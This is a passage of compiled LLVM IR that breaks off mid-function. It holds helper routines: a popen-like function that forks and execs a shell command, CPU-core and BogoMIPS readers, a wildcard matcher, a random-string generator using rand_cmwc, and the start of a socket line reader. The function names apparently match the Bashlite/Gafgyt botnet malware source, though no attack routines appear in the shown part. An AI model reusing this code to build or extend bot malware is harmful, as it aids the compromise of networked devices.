  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

14:                                               ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

19:                                               ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

25:                                               ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

26:                                               ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %28 = call i32 @pipe(i32* noundef %27) #12
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

30:                                               ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

31:                                               ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

34:                                               ; preds = %31
  %35 = call i32 @getdtablesize() #12
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

37:                                               ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %125

38:                                               ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias i8* @malloc(i64 noundef %43) #12
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

47:                                               ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

48:                                               ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* align 1 %50, i8 0, i64 %53, i1 false)
  br label %54

54:                                               ; preds = %48, %31
  %55 = call i32 @vfork() #13
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

56:                                               ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 noundef %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 noundef %61)
  store i32 -1, i32* %3, align 4
  br label %125

63:                                               ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

68:                                               ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

72:                                               ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 noundef %74, i32 noundef 1) #12
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 noundef %77)
  br label %79

79:                                               ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 noundef %81)
  br label %98

83:                                               ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

87:                                               ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 noundef %89, i32 noundef 0) #12
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 noundef %92)
  br label %94

94:                                               ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 noundef %96)
  br label %98

98:                                               ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.40, i64 0, i64 0), i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.41, i64 0, i64 0), i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.42, i64 0, i64 0), i8* noundef %99, i8* noundef null) #12
  call void @_exit(i32 noundef 127) #14
  unreachable

101:                                              ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

106:                                              ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 noundef %110)
  br label %118

112:                                              ; preds = %101
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 noundef %116)
  br label %118

118:                                              ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

125:                                              ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32* noundef) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32 noundef) #3

; Function Attrs: nounwind
declare i32 @dup2(i32 noundef, i32 noundef) #4

; Function Attrs: nounwind
declare i32 @execl(i8* noundef, i8* noundef, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32 noundef) #7

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @fdpclose(i32 noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %9 = load i32*, i32** @fdopen_pids, align 8
  %10 = icmp eq i32* %9, null
  br i1 %10, label %18, label %11

11:                                               ; preds = %1
  %12 = load i32*, i32** @fdopen_pids, align 8
  %13 = load i32, i32* %3, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i32, i32* %12, i64 %14
  %16 = load i32, i32* %15, align 4
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %19

18:                                               ; preds = %11, %1
  store i32 -1, i32* %2, align 4
  br label %58

19:                                               ; preds = %11
  %20 = load i32, i32* %3, align 4
  %21 = call i32 @close(i32 noundef %20)
  %22 = call i32 @sigemptyset(%struct.__sigset_t* noundef %6) #12
  %23 = call i32 @sigaddset(%struct.__sigset_t* noundef %6, i32 noundef 2) #12
  %24 = call i32 @sigaddset(%struct.__sigset_t* noundef %6, i32 noundef 3) #12
  %25 = call i32 @sigaddset(%struct.__sigset_t* noundef %6, i32 noundef 1) #12
  %26 = call i32 @sigprocmask(i32 noundef 0, %struct.__sigset_t* noundef %6, %struct.__sigset_t* noundef %5) #12
  br label %27

27:                                               ; preds = %41, %19
  %28 = load i32*, i32** @fdopen_pids, align 8
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i32, i32* %28, i64 %30
  %32 = load i32, i32* %31, align 4
  %33 = call i32 @waitpid(i32 noundef %32, i32* noundef %7, i32 noundef 0)
  store i32 %33, i32* %8, align 4
  br label %34

34:                                               ; preds = %27
  %35 = load i32, i32* %8, align 4
  %36 = icmp eq i32 %35, -1
  br i1 %36, label %37, label %41

37:                                               ; preds = %34
  %38 = call i32* @__errno_location() #15
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 4
  br label %41

41:                                               ; preds = %37, %34
  %42 = phi i1 [ false, %34 ], [ %40, %37 ]
  br i1 %42, label %27, label %43, !llvm.loop !19

43:                                               ; preds = %41
  %44 = call i32 @sigprocmask(i32 noundef 2, %struct.__sigset_t* noundef %5, %struct.__sigset_t* noundef null) #12
  %45 = load i32*, i32** @fdopen_pids, align 8
  %46 = load i32, i32* %4, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i32, i32* %45, i64 %47
  store i32 0, i32* %48, align 4
  %49 = load i32, i32* %8, align 4
  %50 = icmp eq i32 %49, -1
  br i1 %50, label %51, label %52

51:                                               ; preds = %43
  br label %56

52:                                               ; preds = %43
  %53 = load i32, i32* %7, align 4
  %54 = and i32 %53, 65280
  %55 = ashr i32 %54, 8
  br label %56

56:                                               ; preds = %52, %51
  %57 = phi i32 [ -1, %51 ], [ %55, %52 ]
  store i32 %57, i32* %2, align 4
  br label %58

58:                                               ; preds = %56, %18
  %59 = load i32, i32* %2, align 4
  ret i32 %59
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t* noundef) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t* noundef, i32 noundef) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32 noundef, %struct.__sigset_t* noundef, %struct.__sigset_t* noundef) #4

declare i32 @waitpid(i32 noundef, i32* noundef, i32 noundef) #3

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @fdgets(i8* noundef %0, i32 noundef %1, i32 noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 noundef %28, i8* noundef %32, i64 noundef 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %8, align 4
  br label %9, !llvm.loop !20

37:                                               ; preds = %25
  %38 = load i32, i32* %7, align 4
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %40, label %41

40:                                               ; preds = %37
  br label %43

41:                                               ; preds = %37
  %42 = load i8*, i8** %4, align 8
  br label %43

43:                                               ; preds = %41, %40
  %44 = phi i8* [ null, %40 ], [ %42, %41 ]
  ret i8* %44
}

declare i64 @read(i32 noundef, i8* noundef, i64 noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i64 @parseHex(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

4:                                                ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

9:                                                ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

12:                                               ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %24

14:                                               ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = or i64 %16, %22
  store i64 %23, i64* %3, align 8
  br label %4, !llvm.loop !21

24:                                               ; preds = %12
  %25 = load i64, i64* %3, align 8
  ret i64 %25
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @wildString(i8* noundef %0, i8* noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %54 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %37
  ]

9:                                                ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %76

13:                                               ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* noundef %15, i8* noundef %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %33

19:                                               ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %31

24:                                               ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* noundef %25, i8* noundef %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  br label %31

31:                                               ; preds = %24, %19
  %32 = phi i1 [ false, %19 ], [ %30, %24 ]
  br label %33

33:                                               ; preds = %31, %13
  %34 = phi i1 [ true, %13 ], [ %32, %31 ]
  %35 = xor i1 %34, true
  %36 = zext i1 %35 to i32
  store i32 %36, i32* %3, align 4
  br label %76

37:                                               ; preds = %2
  %38 = load i8*, i8** %5, align 8
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %50

42:                                               ; preds = %37
  %43 = load i8*, i8** %4, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8*, i8** %5, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = call i32 @wildString(i8* noundef %44, i8* noundef %46)
  %48 = icmp ne i32 %47, 0
  %49 = xor i1 %48, true
  br label %50

50:                                               ; preds = %42, %37
  %51 = phi i1 [ false, %37 ], [ %49, %42 ]
  %52 = xor i1 %51, true
  %53 = zext i1 %52 to i32
  store i32 %53, i32* %3, align 4
  br label %76

54:                                               ; preds = %2
  %55 = load i8*, i8** %4, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = call i32 @toupper(i32 noundef %57) #11
  %59 = load i8*, i8** %5, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = call i32 @toupper(i32 noundef %61) #11
  %63 = icmp eq i32 %58, %62
  br i1 %63, label %64, label %72

64:                                               ; preds = %54
  %65 = load i8*, i8** %4, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = load i8*, i8** %5, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 1
  %69 = call i32 @wildString(i8* noundef %66, i8* noundef %68)
  %70 = icmp ne i32 %69, 0
  %71 = xor i1 %70, true
  br label %72

72:                                               ; preds = %64, %54
  %73 = phi i1 [ false, %54 ], [ %71, %64 ]
  %74 = xor i1 %73, true
  %75 = zext i1 %74 to i32
  store i32 %75, i32* %3, align 4
  br label %76

76:                                               ; preds = %72, %50, %33, %9
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

; Function Attrs: nounwind readonly willreturn
declare i32 @toupper(i32 noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @getHost(i8* noundef %0, %struct.in_addr* noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* noundef %7) #12
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

12:                                               ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

13:                                               ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

14:                                               ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8* noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @uppercase(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

3:                                                ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

7:                                                ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 noundef %10) #11
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3, !llvm.loop !22

16:                                               ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @getBogos(i8* noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* noundef getelementptr inbounds ([14 x i8], [14 x i8]* @.str.43, i64 0, i64 0), i32 noundef 0)
  store i32 %7, i32* %4, align 4
  br label %8

8:                                                ; preds = %82, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* noundef %9, i32 noundef 4096, i32 noundef %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %84

13:                                               ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  call void @uppercase(i8* noundef %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %16 = call i8* @strstr(i8* noundef %15, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i64 0, i64 0)) #11
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %82

19:                                               ; preds = %13
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %21 = getelementptr inbounds i8, i8* %20, i64 8
  store i8* %21, i8** %6, align 8
  br label %22

22:                                               ; preds = %39, %19
  %23 = load i8*, i8** %6, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 32
  br i1 %26, label %37, label %27

27:                                               ; preds = %22
  %28 = load i8*, i8** %6, align 8
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 9
  br i1 %31, label %37, label %32

32:                                               ; preds = %27
  %33 = load i8*, i8** %6, align 8
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 58
  br label %37

37:                                               ; preds = %32, %27, %22
  %38 = phi i1 [ true, %27 ], [ true, %22 ], [ %36, %32 ]
  br i1 %38, label %39, label %42

39:                                               ; preds = %37
  %40 = load i8*, i8** %6, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %6, align 8
  br label %22, !llvm.loop !23

42:                                               ; preds = %37
  br label %43

43:                                               ; preds = %63, %42
  %44 = load i8*, i8** %6, align 8
  %45 = load i8*, i8** %6, align 8
  %46 = call i64 @strlen(i8* noundef %45) #11
  %47 = sub i64 %46, 1
  %48 = getelementptr inbounds i8, i8* %44, i64 %47
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = icmp eq i32 %50, 13
  br i1 %51, label %61, label %52

52:                                               ; preds = %43
  %53 = load i8*, i8** %6, align 8
  %54 = load i8*, i8** %6, align 8
  %55 = call i64 @strlen(i8* noundef %54) #11
  %56 = sub i64 %55, 1
  %57 = getelementptr inbounds i8, i8* %53, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 10
  br label %61

61:                                               ; preds = %52, %43
  %62 = phi i1 [ true, %43 ], [ %60, %52 ]
  br i1 %62, label %63, label %69

63:                                               ; preds = %61
  %64 = load i8*, i8** %6, align 8
  %65 = load i8*, i8** %6, align 8
  %66 = call i64 @strlen(i8* noundef %65) #11
  %67 = sub i64 %66, 1
  %68 = getelementptr inbounds i8, i8* %64, i64 %67
  store i8 0, i8* %68, align 1
  br label %43, !llvm.loop !24

69:                                               ; preds = %61
  %70 = load i8*, i8** %6, align 8
  %71 = call i8* @strchr(i8* noundef %70, i32 noundef 46) #11
  %72 = icmp ne i8* %71, null
  br i1 %72, label %73, label %76

73:                                               ; preds = %69
  %74 = load i8*, i8** %6, align 8
  %75 = call i8* @strchr(i8* noundef %74, i32 noundef 46) #11
  store i8 0, i8* %75, align 1
  br label %76

76:                                               ; preds = %73, %69
  %77 = load i8*, i8** %3, align 8
  %78 = load i8*, i8** %6, align 8
  %79 = call i8* @strcpy(i8* noundef %77, i8* noundef %78) #12
  %80 = load i32, i32* %4, align 4
  %81 = call i32 @close(i32 noundef %80)
  store i32 0, i32* %2, align 4
  br label %87

82:                                               ; preds = %13
  %83 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %83, i8 0, i64 4096, i1 false)
  br label %8, !llvm.loop !25

84:                                               ; preds = %8
  %85 = load i32, i32* %4, align 4
  %86 = call i32 @close(i32 noundef %85)
  store i32 1, i32* %2, align 4
  br label %87

87:                                               ; preds = %84, %76
  %88 = load i32, i32* %2, align 4
  ret i32 %88
}

declare i32 @open(i8* noundef, i32 noundef, ...) #3

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8* noundef, i8* noundef) #1

; Function Attrs: nounwind readonly willreturn
declare i8* @strchr(i8* noundef, i32 noundef) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8* noundef, i8* noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* noundef getelementptr inbounds ([14 x i8], [14 x i8]* @.str.43, i64 0, i64 0), i32 noundef 0)
  store i32 %4, i32* %2, align 4
  br label %5

5:                                                ; preds = %19, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* noundef %6, i32 noundef 4096, i32 noundef %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %21

10:                                               ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  call void @uppercase(i8* noundef %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  %13 = call i8* @strstr(i8* noundef %12, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i64 0, i64 0)) #11
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %19

16:                                               ; preds = %10
  %17 = load i32, i32* %1, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* %1, align 4
  br label %19

19:                                               ; preds = %16, %10
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %20, i8 0, i64 4096, i1 false)
  br label %5, !llvm.loop !26

21:                                               ; preds = %5
  %22 = load i32, i32* %2, align 4
  %23 = call i32 @close(i32 noundef %22)
  %24 = load i32, i32* %1, align 4
  ret i32 %24
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @makeRandomStr(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

6:                                                ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

10:                                               ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

19:                                               ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6, !llvm.loop !27

22:                                               ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @recvLine(i32 noundef %0, i8* noundef %1, i32 noundef %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.__sigset_t*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca %struct.__sigset_t*, align 8
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* align 1 %19, i8 0, i64 %21, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

24:                                               ; preds = %3
  store %struct.__sigset_t* %8, %struct.__sigset_t** %11, align 8
  store i32 0, i32* %10, align 4
  br label %25

25:                                               ; preds = %35, %24
  %26 = load i32, i32* %10, align 4
  %27 = zext i32 %26 to i64
